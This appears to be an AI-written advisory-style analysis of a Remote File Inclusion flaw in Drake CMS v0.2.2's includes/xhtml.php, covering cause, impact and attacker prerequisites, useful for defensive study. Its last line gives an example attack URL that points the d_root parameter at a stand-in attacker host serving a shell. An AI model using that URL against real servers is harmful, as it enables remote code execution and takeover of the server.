Based on the provided content, here's a breakdown of the vulnerability:

**Root Cause of Vulnerability:**

*   The vulnerability is a Remote File Inclusion (RFI) vulnerability, located in `includes/xhtml.php`.
*   The vulnerability arises from the insecure use of the `include` statement with a user-controlled parameter `d_root`.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The application directly includes a file path that is supplied by the user, allowing an attacker to include a malicious remote file.
*   **Lack of Input Sanitization:** The application does not sanitize or validate the `d_root` parameter.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including a malicious PHP file from a remote server, an attacker can execute arbitrary code on the server hosting the vulnerable Drake CMS application.
*   **Full System Compromise:** Successful exploitation can lead to a full system compromise of the server, allowing the attacker to gain complete control.

**Attack Vectors:**

*   **HTTP GET Parameter:** The `d_root` parameter is passed via an HTTP GET request, making exploitation simple.
*   **Direct Inclusion:** The vulnerable `include $d_root.'classes/kses.php';` line directly includes the user-provided path.

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs network access to the vulnerable server.
*   **Basic HTTP Knowledge:** The attacker needs basic knowledge of HTTP to construct the malicious request.
*   **PHP Knowledge (for crafting payload):** The attacker needs knowledge of PHP to create a malicious PHP payload, such as a web shell, to execute remotely.
*  **PHP `register_globals` enabled**: The vendor mentions that the vulnerability can only be exploited when the PHP `register_globals` INI setting is enabled.

**Additional Notes:**
*   The vulnerability exists in Drake CMS v0.2.2 ALPHA rev.846.
*   The vulnerability has been fixed in subsequent releases of Drake CMS, meaning the vulnerability was patched after this version.
*   The exploit involves crafting a URL with the `d_root` parameter pointing to a malicious PHP script hosted on an attacker-controlled server, e.g., http://[target]/[path]/includes/xhtml.php?d_root=http://evilsite.com/shell?
